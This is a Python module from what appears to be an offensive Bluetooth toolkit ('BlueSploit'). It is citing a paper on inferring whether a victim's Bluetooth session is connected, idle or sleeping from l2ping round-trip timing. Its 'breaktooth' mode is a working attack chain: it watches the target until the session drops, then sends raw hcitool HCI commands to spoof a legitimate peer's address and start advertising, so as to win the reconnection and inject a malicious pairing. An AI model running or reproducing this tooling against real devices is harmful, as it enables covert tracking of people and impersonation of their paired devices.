"""
BlueSploit Auxiliary: Stealtooth Session Monitor + Breaktooth Re-Pair Trigger

Stealtooth (arxiv 2507.00847, 2025): uses l2ping echo request RTT timing and
success/failure to remotely infer the state of a Bluetooth session between
victim devices — connected, idle, or sleeping — WITHOUT pairing or any
authenticated access to the target.

Breaktooth: combines Stealtooth state monitoring with automatic re-pair
injection — when a victim session drops (detected by l2ping state change),
the attacker immediately advertises as the legitimate peer to win the
reconnection race and inject a malicious pairing.

State inference signals:
  - l2ping RTT < 30ms        → device idle (radio active, fast response)
  - l2ping RTT 30–200ms      → device in active session with another peer
  - l2ping RTT > 200ms       → device in low-power / sniff mode
  - l2ping no response        → device disconnected / in deep sleep
  - RTT jitter > 50%          → contention with active session

Modes:
  monitor   — Passively probe target with l2ping, classify session state over time
  trigger   — Wait for state transition (active→idle), launch re-pair injection
  breaktooth — Full attack: monitor + auto-trigger spoofed advertising on drop

Reference:
  Stealtooth: Remote Session Monitoring of Bluetooth Devices via l2ping
  https://arxiv.org/html/2507.00847v1
"""

import os
import re
import statistics
import subprocess
import threading
import time
from typing import Dict, List, Optional, Tuple
from core.base import AuxiliaryModule, ModuleInfo, ModuleOption, BTProtocol, Severity
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors
)


# State classification thresholds (milliseconds)
STATE_IDLE_RTT_MAX     = 30
STATE_ACTIVE_RTT_MAX   = 200
STATE_SLEEP_RTT_MAX    = 1500
JITTER_THRESHOLD_PCT   = 50


def _l2ping_one(target: str, timeout_s: int = 2) -> Optional[float]:
    """Send a single l2ping, return RTT in ms or None on failure."""
    try:
        r = subprocess.run(
            ["l2ping", "-c", "1", "-t", str(timeout_s), target],
            capture_output=True, text=True, timeout=timeout_s + 2,
        )
        if r.returncode != 0:
            return None
        # Parse "0 bytes from AA:BB:CC:DD:EE:FF id 0 time 12.34ms"
        m = re.search(r"time\s+([\d.]+)\s*ms", r.stdout)
        if m:
            return float(m.group(1))
    except (subprocess.TimeoutExpired, OSError):
        return None
    return None


def _classify_state(rtt_samples: List[Optional[float]]) -> str:
    """Classify session state from a window of RTT samples."""
    successes = [r for r in rtt_samples if r is not None]
    if not successes:
        return "disconnected"
    if len(successes) < len(rtt_samples) // 2:
        return "intermittent"

    avg = statistics.mean(successes)
    jitter_pct = 0.0
    if len(successes) > 1:
        stdev = statistics.stdev(successes)
        jitter_pct = (stdev / avg) * 100 if avg > 0 else 0

    if avg <= STATE_IDLE_RTT_MAX:
        return "idle"
    if avg <= STATE_ACTIVE_RTT_MAX:
        return "active_session" if jitter_pct > JITTER_THRESHOLD_PCT else "connected_idle"
    if avg <= STATE_SLEEP_RTT_MAX:
        return "sniff_mode"
    return "deep_sleep"


class Module(AuxiliaryModule):
    """
    Stealtooth + Breaktooth — l2ping-Based Session Monitor & Re-Pair Trigger

    Remotely infers Bluetooth session state via l2ping RTT timing patterns,
    optionally triggers spoofed re-pair advertising the moment a session
    drops to win the reconnection race.
    """

    info = ModuleInfo(
        name="Stealtooth + Breaktooth",
        description=(
            "Infer BT session state via l2ping RTT timing without pairing; "
            "auto-trigger re-pair injection on state drop (arxiv 2507.00847)"
        ),
        author=["BlueSploit"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.HIGH,
        cve=None,
        references=[
            "https://arxiv.org/html/2507.00847v1",
            "https://www.scitepress.org/Papers/2024/128457/128457.pdf",
        ],
    )

    def _setup_options(self) -> None:
        self.add_option(ModuleOption(
            name="mode",
            required=True,
            description="Mode: monitor, trigger, breaktooth",
            default="monitor",
        ))
        self.add_option(ModuleOption(
            name="target",
            required=True,
            description="Target Bluetooth BD_ADDR to monitor",
        ))
        self.add_option(ModuleOption(
            name="duration",
            required=False,
            description="Monitoring duration in seconds (0 = indefinite)",
            default=300,
        ))
        self.add_option(ModuleOption(
            name="probe_interval_ms",
            required=False,
            description="Interval between l2ping probes in milliseconds",
            default=500,
        ))
        self.add_option(ModuleOption(
            name="window_size",
            required=False,
            description="RTT samples per state classification window",
            default=8,
        ))
        self.add_option(ModuleOption(
            name="trigger_state",
            required=False,
            description="State transition that fires the trigger (e.g. 'disconnected', 'idle')",
            default="disconnected",
        ))
        self.add_option(ModuleOption(
            name="impersonate_addr",
            required=False,
            description="BD_ADDR to spoof when re-pair fires (breaktooth mode)",
            default=None,
        ))
        self.add_option(ModuleOption(
            name="interface",
            required=False,
            description="Local HCI adapter (for breaktooth re-pair)",
            default="hci0",
        ))
        self.add_option(ModuleOption(
            name="output_file",
            required=False,
            description="JSONL log of state transitions",
            default=None,
        ))

    def check(self) -> bool:
        target = self.get_option("target")
        if not self.validate_bd_addr(target):
            print_error(f"Invalid target: {target}")
            return False
        if subprocess.run(["which", "l2ping"], capture_output=True).returncode != 0:
            print_error("l2ping not found — install bluez-utils")
            return False
        mode = (self.get_option("mode") or "monitor").lower()
        if mode not in ("monitor", "trigger", "breaktooth"):
            print_error(f"Invalid mode: {mode}")
            return False
        if mode == "breaktooth" and not self.get_option("impersonate_addr"):
            print_error("breaktooth mode requires impersonate_addr")
            return False
        return True

    def run(self) -> bool:
        if os.geteuid() != 0:
            print_error("Root required for l2ping and HCI advertising")
            return False
        if not self.check():
            return False

        mode    = (self.get_option("mode") or "monitor").lower()
        target  = self.get_option("target")
        duration = int(self.get_option("duration"))
        interval_ms = int(self.get_option("probe_interval_ms"))
        window  = int(self.get_option("window_size"))

        C = Colors
        print(f"\n  {C.RED}╔{'═'*58}╗{C.RESET}")
        print(f"  {C.RED}║{C.RESET} {C.BOLD}Stealtooth + Breaktooth{C.RESET}                                  {C.RED}║{C.RESET}")
        print(f"  {C.RED}╚{'═'*58}╝{C.RESET}\n")

        print_info(f"Mode        : {mode}")
        print_info(f"Target      : {target}")
        print_info(f"Probe ivl   : {interval_ms}ms")
        print_info(f"Window      : {window} samples")
        print_warning("DISCLAIMER: For authorized security testing only!")

        if mode == "monitor":
            return self._monitor(target, duration, interval_ms, window)
        if mode == "trigger":
            return self._trigger(target, duration, interval_ms, window)
        if mode == "breaktooth":
            return self._breaktooth(target, duration, interval_ms, window)
        return False

    def _sample_loop(self, target: str, duration: int, interval_ms: int,
                     window: int, on_transition=None) -> List[Dict]:
        """
        Core sampling loop. Probes target with l2ping at given interval,
        classifies state per window, calls on_transition(old, new, ts) when
        state changes.
        """
        samples: List[Optional[float]] = []
        transitions: List[Dict] = []
        current_state = "unknown"
        start = time.time()

        try:
            while True:
                elapsed = time.time() - start
                if duration > 0 and elapsed >= duration:
                    break

                rtt = _l2ping_one(target, timeout_s=2)
                samples.append(rtt)
                if len(samples) > window:
                    samples.pop(0)

                if len(samples) >= window:
                    new_state = _classify_state(samples)
                    if new_state != current_state:
                        ts = time.time()
                        old_state = current_state
                        current_state = new_state
                        rtt_str = f"{rtt:.1f}ms" if rtt is not None else "no-resp"
                        print_success(
                            f"  [+{elapsed:6.1f}s] state: {old_state:18s} → "
                            f"{new_state:18s} (rtt={rtt_str})"
                        )
                        transitions.append({
                            "ts": ts,
                            "elapsed": elapsed,
                            "old_state": old_state,
                            "new_state": new_state,
                            "current_rtt_ms": rtt,
                        })
                        if on_transition:
                            if on_transition(old_state, new_state, ts):
                                break

                rtt_str = f"{rtt:5.1f}ms" if rtt is not None else "  miss "
                print(f"\r  Probing {target}  rtt={rtt_str}  state={current_state:18s}",
                      end="", flush=True)

                time.sleep(interval_ms / 1000)
        except KeyboardInterrupt:
            print_warning("\nStopped by user")

        print()
        return transitions

    def _monitor(self, target: str, duration: int,
                 interval_ms: int, window: int) -> bool:
        print_info(f"\n[Stealtooth] Monitoring {target} for session state changes\n")
        transitions = self._sample_loop(target, duration, interval_ms, window)

        if transitions:
            print_success(f"\nObserved {len(transitions)} state transitions")
            print_info("\nState distribution:")
            counts: Dict[str, int] = {}
            for t in transitions:
                counts[t["new_state"]] = counts.get(t["new_state"], 0) + 1
            for s, c in sorted(counts.items(), key=lambda x: -x[1]):
                print_info(f"  {s:20s}: {c}")

        output = self.get_option("output_file")
        if output and transitions:
            import json
            try:
                with open(output, "w") as f:
                    for t in transitions:
                        f.write(json.dumps(t) + "\n")
                print_success(f"\nLog saved: {output}")
            except OSError as e:
                print_error(f"Cannot write log: {e}")

        self.add_result({
            "mode": "monitor",
            "target": target,
            "transitions": len(transitions),
            "state_counts": counts if transitions else {},
        })
        return len(transitions) > 0

    def _trigger(self, target: str, duration: int,
                 interval_ms: int, window: int) -> bool:
        wait_state = (self.get_option("trigger_state") or "disconnected").lower()
        print_info(f"\n[Stealtooth Trigger] Waiting for state → {wait_state}")
        print_info("Will report when target session drops\n")

        fired = {"hit": False, "ts": None}

        def on_transition(old, new, ts) -> bool:
            if new == wait_state:
                fired["hit"] = True
                fired["ts"] = ts
                print_success(f"\n>>> Trigger fired at {ts:.2f} (state={new}) <<<")
                return True  # stop the loop
            return False

        transitions = self._sample_loop(
            target, duration, interval_ms, window, on_transition
        )

        self.add_result({
            "mode": "trigger",
            "target": target,
            "wait_state": wait_state,
            "fired": fired["hit"],
            "fire_time": fired["ts"],
            "transitions_observed": len(transitions),
        })
        return fired["hit"]

    def _breaktooth(self, target: str, duration: int,
                    interval_ms: int, window: int) -> bool:
        impersonate = self.get_option("impersonate_addr")
        adapter     = self.get_option("interface") or "hci0"
        wait_state  = (self.get_option("trigger_state") or "disconnected").lower()

        print_info(f"\n[Breaktooth] Full chain — monitor + auto re-pair")
        print_info(f"  Watching {target} for state → {wait_state}")
        print_info(f"  On trigger: spoof {impersonate} on {adapter}")
        print_warning("Spoofed advertising fires immediately on session drop")

        fired = {"hit": False, "ts": None}

        def _start_spoof_advertising():
            """Fire HCI commands to advertise as the impersonated peer."""
            try:
                # Disable, set random addr to victim, set adv data, enable
                addr_bytes = bytes(int(x, 16) for x in reversed(impersonate.split(":")))
                subprocess.run(["hcitool", "-i", adapter, "cmd", "0x08", "0x000a", "0x00"],
                               capture_output=True, timeout=2)
                subprocess.run(
                    ["hcitool", "-i", adapter, "cmd", "0x08", "0x0005"] +
                    [f"0x{b:02x}" for b in addr_bytes],
                    capture_output=True, timeout=2,
                )
                # Minimal flags-only adv data
                subprocess.run(
                    ["hcitool", "-i", adapter, "cmd", "0x08", "0x0008",
                     "0x03", "0x02", "0x01", "0x06",
                     "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00",
                     "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00",
                     "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00",
                     "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00",
                     "0x00", "0x00", "0x00"],
                    capture_output=True, timeout=2,
                )
                subprocess.run(["hcitool", "-i", adapter, "cmd", "0x08", "0x000a", "0x01"],
                               capture_output=True, timeout=2)
                print_success(f"  Spoofed advertising as {impersonate} on {adapter}")
                return True
            except Exception as e:
                print_error(f"  Spoof launch error: {e}")
                return False

        def on_transition(old, new, ts) -> bool:
            if new == wait_state and not fired["hit"]:
                fired["hit"] = True
                fired["ts"] = ts
                print_success(f"\n>>> Breaktooth trigger at {ts:.2f} <<<")
                _start_spoof_advertising()
                # Don't stop loop — keep monitoring to confirm reconnect
                return False
            return False

        transitions = self._sample_loop(
            target, duration, interval_ms, window, on_transition
        )

        # Always disable spoof advertising on exit
        try:
            subprocess.run(["hcitool", "-i", adapter, "cmd", "0x08", "0x000a", "0x00"],
                           capture_output=True, timeout=2)
            print_info("\nSpoofed advertising disabled")
        except Exception:
            pass

        self.add_result({
            "mode": "breaktooth",
            "target": target,
            "impersonate": impersonate,
            "trigger_state": wait_state,
            "trigger_fired": fired["hit"],
            "transitions": len(transitions),
        })
        return fired["hit"]
